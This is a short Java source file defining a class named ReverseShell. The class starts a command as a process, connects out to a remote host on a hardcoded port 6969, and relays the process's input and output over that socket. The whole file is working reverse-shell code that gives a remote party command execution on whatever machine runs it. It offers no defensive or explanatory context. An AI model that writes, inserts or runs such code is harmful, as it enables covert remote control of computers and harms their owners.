package dev.toe;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import lombok.RequiredArgsConstructor;

@RequiredArgsConstructor
public class ReverseShell extends Thread {
  public final String host;
  public final int port;
  public final String command;

  private Thread shellThread;
  private Socket socket;
  private Process process;

  public void run() {
    try {
      int port = 6969;
      process = new ProcessBuilder(command).redirectErrorStream(true).start();
      socket = new Socket(host, port);
      InputStream pi = process.getInputStream(), pe = process.getErrorStream(),
                  si = socket.getInputStream();
      OutputStream po = process.getOutputStream(), so =
                                                       socket.getOutputStream();
      while (!socket.isClosed()) {
        while (pi.available() > 0)
          so.write(pi.read());
        while (pe.available() > 0)
          so.write(pe.read());
        while (si.available() > 0)
          po.write(si.read());
        so.flush();
        po.flush();
        Thread.sleep(50);
        try {
          process.exitValue();
          break;
        } catch (Exception e) {
        }
      };
      process.destroy();
      socket.close();
    } catch (Exception e) {
    }
  }

  public void close() { this.shellThread.interrupt(); }
}